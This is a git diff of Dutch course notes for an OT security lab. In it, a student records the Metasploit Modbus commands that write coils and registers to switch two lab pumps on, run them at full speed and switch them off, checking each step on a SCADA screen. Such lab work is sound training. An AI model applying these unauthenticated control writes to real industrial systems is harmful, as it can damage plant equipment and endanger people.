@@ -314,15 +314,33 @@ We gaan nu proberen beide pompen aan te zetten en het toerental van de pompen ma
 We hebben nu de juiste geheugenadressen gevonden.  
 Dit zijn 2 coils en 2 registers. We gaan deze nu via Metasploit aanpassen.
 
+> lab eerst gereset
+
 - Kopieer de read output naar een tekst bestand en pas deze aan.
   - Kijk goed in metasploit bij options hoe de dataregisters en de coils geschreven moeten worden.
+  - ![1773415595753](image/OT-week6/1773415595753.png)
+
 - Zet beide pompen aan. Verander hiervoor de gevonden coils waardes en kopieer de binary data in het veld DATA_COILS.
+  - `set action WRITE_COILS`, `set DATA_ADDRESS 0`, `set DATA_COILS 1,0,0,0,0,0,0,0,1`
+    - van index 0 t/m 8 -> 0 is pomp 1, 8 is pomp 2. alles ertussen uit laten.
+
 - Zet de correcte actie: set action WRITE_COILS en start de scanner met run.
-  - **Maak een screenshot van het resultaat en verifieer op de SCADA of de pompen aan staan.**
+  - **Maak een screenshot van het resultaat en verifieer op de SCADA of de pompen aan staan**
+  - ![1773415775153](image/OT-week6/1773415775153.png)
+  - ![1773416053849](image/OT-week6/1773416053849.png)
+  - pomp 1 en 2 staan aan
+
 - Verander de snelheid van beide pompen. Verander hiervoor de gevonden input register waardes en kopieer de register waardes naar het veld DATA_REGISTERS.
+  - `set action WRITE_REGISTERS`, `set DATA_ADDRESS 10`, `set DATA_REGISTERS 100,0,0,0,0,0,0,0,0,0,100`
+
 - Zet de correcte actie: set action WRITE_REGISTERS en start de scanner met run.
   - **Maak een screenshot van het resultaat en verifieer op de SCADA of de pompen op vol vermogen aanstaan. Wat valt je op?**
-- Zet nu beide pompen via metasploit uit. Maak een screenshot van het resultaat
+  - ![1773416567536](image/OT-week6/1773416567536.png)
+  - ![1773416619418](image/OT-week6/1773416619418.png)
 
+- Zet nu beide pompen via metasploit uit. Maak een screenshot van het resultaat
+  - `set action WRITE_COILS`, `set DATA_ADDRESS 0`, `set DATA_COILS 000000000`
+  - ![1773416863918](image/OT-week6/1773416863918.png)
+  - ![1773416885981](image/OT-week6/1773416885981.png)
 
 
